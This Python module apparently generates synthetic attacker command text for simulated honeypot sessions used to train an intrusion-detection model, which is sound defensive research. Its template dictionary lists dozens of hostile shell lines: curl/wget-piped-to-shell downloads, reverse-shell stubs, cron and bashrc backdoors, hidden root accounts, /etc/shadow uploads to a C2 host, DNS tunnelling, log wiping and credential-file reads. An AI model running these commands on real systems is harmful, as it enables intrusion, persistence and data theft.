"""
sim_commands.py — realistic per-micro-state command text for simulated sessions.

Why this exists
---------------
`kill_chain_simulator.generate_balanced_sessions()` emits session *skeletons*
with no `command_text`. If those rows go straight into feature extraction, the
semantic feature block (group D, indices 76-105 — 30 of the 128 features) comes
out all-zeros for every simulated row. A downstream generator (TabSyn) would then
trivially learn "all-zero semantic block => one of the synthetic-only classes",
i.e. an artifact leak, not a real learned distribution.

This module gives each of the 45 micro-states a small pool of representative
attacker command lines drawn from the MITRE technique the state maps to, so the
DistilBERT->PCA semantic projection carries genuine per-class signal. Output
format matches the real Cowrie `command_text` convention in
`real_sessions_combined.parquet`: individual commands joined with ` ; `.

Usage
-----
    from src.generators.sim_commands import add_command_text
    df_sim = add_command_text(df_sim, seed=42)   # adds a 'command_text' column
"""
from __future__ import annotations

import random
from typing import Dict, List

import pandas as pd

# One representative command pool per micro-state label. Kept deliberately
# varied within a class (different tools / flags / targets) so the semantic
# projection sees intra-class spread, not a single memorized string.
COMMAND_TEMPLATES: Dict[str, List[str]] = {
    # --- Phase 0: Reconnaissance -------------------------------------------
    "RECON_DNS": [
        "dig +short example.com; host -t any example.com",
        "nslookup -type=mx target.local; dig axfr @ns1 target.local",
        "for s in www mail vpn dev; do host $s.target.local; done",
    ],
    "RECON_IP_SCAN": [
        "nmap -sn 10.0.0.0/24; fping -a -g 10.0.0.0/24 2>/dev/null",
        "for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i; done",
        "masscan 10.0.0.0/16 -p1-1000 --rate 1000",
    ],
    "RECON_VERSION_PROBE": [
        "nmap -sV -p22,80,443 10.0.0.5; curl -sI http://10.0.0.5",
        "nc -v 10.0.0.5 22; echo | openssl s_client -connect 10.0.0.5:443",
        "nmap -sV --version-intensity 5 10.0.0.5",
    ],
    "RECON_OS_DETECT": [
        "nmap -O 10.0.0.5; ping -c1 10.0.0.5 | grep ttl",
        "xprobe2 10.0.0.5; nmap -O --osscan-guess 10.0.0.5",
        "hping3 -S -p 80 -c 3 10.0.0.5",
    ],
    "RECON_VULN_SCAN": [
        "nikto -h http://10.0.0.5; nmap --script vuln 10.0.0.5",
        "nmap --script http-vuln* -p80,443 10.0.0.5",
        "wpscan --url http://10.0.0.5 --enumerate vp",
    ],
    "RECON_USER_ENUM": [
        "for u in root admin oracle test; do id $u; done; getent passwd",
        "enum4linux -U 10.0.0.5; smbclient -L //10.0.0.5 -N",
        "curl -s http://10.0.0.5/?user=admin; finger @10.0.0.5",
    ],
    # --- Phase 1: Initial Access -------------------------------------------
    "ACCESS_BRUTE_SSH": [
        "hydra -l root -P rockyou.txt ssh://10.0.0.5",
        "for p in 123456 admin root toor password; do sshpass -p $p ssh root@10.0.0.5 id; done",
        "ncrack -p 22 --user root -P wordlist.txt 10.0.0.5",
    ],
    "ACCESS_BRUTE_HTTP": [
        "hydra -l admin -P pass.txt 10.0.0.5 http-post-form '/login:u=^USER^&p=^PASS^:F=invalid'",
        "wfuzz -c -z file,pass.txt -d 'user=admin&pass=FUZZ' http://10.0.0.5/login",
        "curl -s -d 'user=admin&pass=admin' http://10.0.0.5/login",
    ],
    "ACCESS_CRED_STUFF": [
        "python3 credstuff.py --combo leaked.txt --url http://10.0.0.5/api/login",
        "for c in $(cat combos.txt); do curl -s -u $c http://10.0.0.5/api; done",
        "medusa -h 10.0.0.5 -C combo.txt -M http",
    ],
    "ACCESS_DEFAULT_CRED": [
        "sshpass -p admin ssh admin@10.0.0.5; mysql -uroot -proot -h10.0.0.5",
        "curl -u admin:admin http://10.0.0.5/manager/html",
        "ssh pi@10.0.0.5  # raspberry",
    ],
    "ACCESS_KEX_EXPLOIT": [
        "python3 exploit_kex.py --target 10.0.0.5 --port 22",
        "ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.0.0.5",
        "./libssh_auth_bypass 10.0.0.5 22",
    ],
    "ACCESS_AUTH_BYPASS": [
        "curl -s 'http://10.0.0.5/admin/../../etc/passwd'",
        "curl -H 'X-Forwarded-For: 127.0.0.1' http://10.0.0.5/admin",
        "sqlmap -u 'http://10.0.0.5/login' --data 'u=1&p=1' --batch",
    ],
    # --- Phase 2: Execution ------------------------------------------------
    "EXEC_SHELL_OPEN": [
        "sh; bash -i; /bin/sh -c 'echo shell'",
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
        "busybox sh; export TERM=xterm; stty raw -echo",
    ],
    "EXEC_PYTHON_SCRIPT": [
        "python3 -c 'import os;os.system(\"id\")'; python3 payload.py",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.9\",4444))'",
        "wget -qO- http://10.0.0.9/p.py | python3 -",
    ],
    "EXEC_PERL_SCRIPT": [
        "perl -e 'use Socket;$i=\"10.0.0.9\";$p=4444;'",
        "perl backconnect.pl 10.0.0.9 4444; perl -MIO -e 'system(\"id\")'",
        "curl -s http://10.0.0.9/s.pl | perl -",
    ],
    "EXEC_CURL_BASH": [
        "curl -s http://10.0.0.9/install.sh | bash",
        "curl -fsSL http://10.0.0.9/x.sh | sh -",
        "bash -c \"$(curl -fsSL http://10.0.0.9/setup.sh)\"",
    ],
    "EXEC_WGET_EXEC": [
        "wget http://10.0.0.9/bot -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot",
        "cd /tmp; wget -q http://10.0.0.9/xmrig; chmod 777 xmrig; ./xmrig &",
        "wget http://10.0.0.9/m.sh -O- | sh",
    ],
    "EXEC_MEMFD_EXEC": [
        "python3 -c 'import ctypes,os;fd=os.memfd_create(\"x\")'",
        "./loader; # fileless memfd_create exec of downloaded ELF",
        "cp /proc/self/exe /dev/shm/.x; /dev/shm/.x",
    ],
    # --- Phase 3: Discovery ------------------------------------------------
    "DISC_ENV_PROBE": [
        "id; whoami; hostname; uname -a; cat /etc/os-release",
        "env; cat /etc/issue; lsb_release -a; cat /proc/version",
        "arch; hostname; id; free -m; cat /proc/cpuinfo",
    ],
    "DISC_NETSTAT_SCAN": [
        "netstat -antup; ss -tulpn; cat /proc/net/tcp",
        "ss -antp; arp -a; ip route; cat /etc/hosts",
        "netstat -rn; ifconfig -a; ip addr",
    ],
    "DISC_PROC_ENUM": [
        "ps aux; ps -ef; top -bn1 | head -20",
        "ls -la /proc/*/exe 2>/dev/null; ps auxww",
        "pstree -p; ps aux --sort=-%mem | head",
    ],
    "DISC_SUID_HUNT": [
        "find / -perm -4000 -type f 2>/dev/null",
        "find / -perm -u=s -type f 2>/dev/null; find / -writable -type d 2>/dev/null",
        "getcap -r / 2>/dev/null; find / -perm -2000 2>/dev/null",
    ],
    "DISC_CVE_SEARCH": [
        "uname -r; searchsploit linux kernel $(uname -r)",
        "cat /etc/os-release; dpkg -l | grep -i openssl",
        "rpm -qa | grep kernel; ls /usr/src",
    ],
    # --- Phase 4: Privilege Escalation -------------------------------------
    "PRIVESC_SUDO_ABUSE": [
        "sudo -l; sudo -n true; sudo vim -c '!sh'",
        "sudo -l 2>/dev/null; sudo find / -exec /bin/sh \\; -quit",
        "sudo less /etc/shadow; sudo awk 'BEGIN{system(\"/bin/sh\")}'",
    ],
    "PRIVESC_SUID_EXPLOIT": [
        "/usr/bin/find . -exec /bin/sh -p \\; -quit",
        "cp /bin/sh /tmp/rootsh; ./exploit_suid; /tmp/rootsh -p",
        "nmap --interactive # !sh via suid",
    ],
    "PRIVESC_KERNEL_XPLOIT": [
        "gcc dirtycow.c -o dc -pthread; ./dc",
        "wget http://10.0.0.9/pwnkit; chmod +x pwnkit; ./pwnkit",
        "./cve-2021-4034; ./exploit; id",
    ],
    "PRIVESC_CONTAINER_ESC": [
        "cat /proc/1/cgroup; ls -la /.dockerenv",
        "mount -o bind / /mnt; chroot /mnt sh; capsh --print",
        "docker run -v /:/host -it alpine chroot /host sh",
    ],
    # --- Phase 5: Persistence ----------------------------------------------
    "PERSIST_CRONTAB": [
        "(crontab -l; echo '* * * * * curl -s 10.0.0.9/c|sh') | crontab -",
        "echo '@reboot /tmp/bot' >> /var/spool/cron/root",
        "echo '*/5 * * * * root /tmp/.x' >> /etc/crontab",
    ],
    "PERSIST_BASHRC": [
        "echo 'curl -s 10.0.0.9/c|sh' >> ~/.bashrc",
        "echo 'alias ls=\"/tmp/.x; ls\"' >> ~/.bash_profile",
        "echo '/tmp/backdoor &' >> /etc/profile",
    ],
    "PERSIST_SSH_KEY_ADD": [
        "mkdir -p ~/.ssh; echo 'ssh-rsa AAAA... attacker' >> ~/.ssh/authorized_keys",
        "curl -s 10.0.0.9/id.pub >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys",
        "echo $KEY >> /root/.ssh/authorized_keys",
    ],
    "PERSIST_BACKDOOR_ADD": [
        "useradd -o -u 0 -g 0 -M -d /root sync2; echo sync2:pass | chpasswd",
        "echo 'toor:x:0:0::/root:/bin/bash' >> /etc/passwd",
        "openssl passwd -1 pass; echo bd:HASH:0:0::/root:/bin/bash >> /etc/passwd",
    ],
    "PERSIST_SYSTEMD_SVC": [
        "cat >/etc/systemd/system/x.service<<EOF\\n[Service]\\nExecStart=/tmp/.x\\nEOF; systemctl enable x",
        "systemctl enable --now updater.service; systemctl daemon-reload",
        "cp x.service /etc/systemd/system/; systemctl start x",
    ],
    # --- Phase 6: Defense Evasion ------------------------------------------
    "EVASION_LOG_WIPE": [
        "rm -f /var/log/auth.log; echo > /var/log/syslog; :> /var/log/wtmp",
        "shred -u /var/log/secure; find /var/log -type f -exec truncate -s0 {} \\;",
        "wipe /var/log/*; logrotate -f /etc/logrotate.conf",
    ],
    "EVASION_HIST_ERASE": [
        "history -c; unset HISTFILE; rm -f ~/.bash_history",
        "export HISTSIZE=0; cat /dev/null > ~/.bash_history",
        "ln -sf /dev/null ~/.bash_history; history -w",
    ],
    "EVASION_CHMOD_HIDE": [
        "mv bot /tmp/.x; chmod +x /tmp/.x; chattr +i /tmp/.x",
        "touch -r /bin/ls /tmp/.x; chmod 755 /tmp/.hidden",
        "mkdir /dev/shm/...; cp bot /dev/shm/.../",
    ],
    "EVASION_CURL_OBFUS": [
        "echo Y3VybCAxMC4wLjAuOS9jfHNo | base64 -d | sh",
        "eval $(printf '\\143\\165\\162\\154'); curl -A '' -s 10.0.0.9/c|sh",
        "c$(echo url)  10.0.0.9/x | s$(echo h)",
    ],
    "EVASION_PROC_INJECT": [
        "gdb -p 1234 -batch -ex 'call system(\"id\")'",
        "echo /tmp/.so > /proc/1234/mem  # ld_preload inject",
        "LD_PRELOAD=/tmp/eh.so /bin/true",
    ],
    # --- Phase 7: Lateral Movement -----------------------------------------
    "LATERAL_SSH_SPREAD": [
        "for h in $(cat /root/.ssh/known_hosts); do ssh $h 'curl -s 10.0.0.9/c|sh'; done",
        "ssh -i id_rsa root@10.0.0.6 'wget 10.0.0.9/bot -O- | sh'",
        "pssh -h hosts.txt -i 'id; uname -a'",
    ],
    "LATERAL_SCAN_PIVOT": [
        "ssh -D 1080 root@10.0.0.6; proxychains nmap -sT 10.1.0.0/24",
        "chisel client 10.0.0.9:8080 R:socks; nmap -sn 10.2.0.0/24",
        "ssh -L 8022:10.2.0.5:22 root@10.0.0.6",
    ],
    "LATERAL_CRED_REUSE": [
        "cat /root/.ssh/id_rsa; for h in 10.0.0.6 10.0.0.7; do ssh -i id_rsa root@$h id; done",
        "mimipenguin 2>/dev/null; grep -r password /home 2>/dev/null",
        "cat ~/.aws/credentials; cat ~/.netrc",
    ],
    # --- Phase 8: Exfiltration ---------------------------------------------
    "EXFIL_SCP_DATA": [
        "scp -r /etc/passwd /var/www attacker@10.0.0.9:/loot/",
        "rsync -az /home/ attacker@10.0.0.9:/loot/",
        "sftp attacker@10.0.0.9 <<< 'put -r /data'",
    ],
    "EXFIL_CURL_C2": [
        "curl -s -X POST --data-binary @/etc/shadow http://10.0.0.9/up",
        "tar cz /data | curl -s -F 'f=@-' http://10.0.0.9/up",
        "curl -s -T dump.sql http://10.0.0.9/exfil",
    ],
    "EXFIL_DNS_TUNNEL": [
        "for c in $(base64 secret|tr -d '\\n'|fold -w30); do dig $c.exfil.10-0-0-9.attacker; done",
        "iodine -f -P pass 10.0.0.9 t.attacker.com",
        "dnscat2 --dns server=10.0.0.9",
    ],
    "EXFIL_STAGING_TAR": [
        "tar czf /tmp/.loot.tgz /etc /home /var/www 2>/dev/null",
        "zip -r -P pass /tmp/loot.zip /data; split -b 10m /tmp/loot.zip",
        "cd /tmp; tar cf loot.tar /root; gzip loot.tar",
    ],
    "EXFIL_TUNNEL_NGROK": [
        "./ngrok tcp 22; ./ngrok http 8080",
        "curl -s 10.0.0.9/ngrok -o ngrok; chmod +x ngrok; ./ngrok tcp 22",
        "cloudflared tunnel --url tcp://localhost:22",
    ],
}


def sample_command_text(label: str, rng: random.Random) -> str:
    """
    Return a realistic ` ; `-joined command string for a micro-state label.

    Picks one template from the label's pool as the anchor, and with moderate
    probability appends a short discovery preamble (attackers usually orient
    before acting), so sessions vary in length the way real ones do.
    """
    pool = COMMAND_TEMPLATES.get(label)
    if not pool:
        # No template for this label (shouldn't happen for the 45 known states)
        # -> leave empty; extractor will zero the semantic block for this row.
        return ""

    anchor = rng.choice(pool)

    # ~40% of the time, prepend a light recon preamble unless this *is* a
    # discovery/recon state already (avoid duplicating that flavor).
    if not label.startswith(("RECON_", "DISC_")) and rng.random() < 0.4:
        preamble = rng.choice(["id", "whoami", "uname -a", "pwd", "ls -la"])
        return f"{preamble} ; {anchor}"
    return anchor


def add_command_text(df: pd.DataFrame,
                     seed: int = 42,
                     label_col: str = "micro_state",
                     out_col: str = "command_text") -> pd.DataFrame:
    """
    Add (or overwrite) a `command_text` column on a simulated-session DataFrame,
    keyed off each row's micro_state label. Deterministic given `seed`.

    Returns the same DataFrame (modified in place and also returned).
    """
    rng = random.Random(seed)
    df[out_col] = [sample_command_text(lbl, rng) for lbl in df[label_col]]
    return df


if __name__ == "__main__":
    # Sanity check: every known micro-state has a non-empty template pool.
    missing = [k for k, v in COMMAND_TEMPLATES.items() if not v]
    print(f"micro-states with command templates: {len(COMMAND_TEMPLATES)}")
    print(f"empty pools: {missing if missing else 'none'}")
    _rng = random.Random(0)
    for _lbl in list(COMMAND_TEMPLATES)[:3]:
        print(f"  {_lbl!r:28s} -> {sample_command_text(_lbl, _rng)!r}")
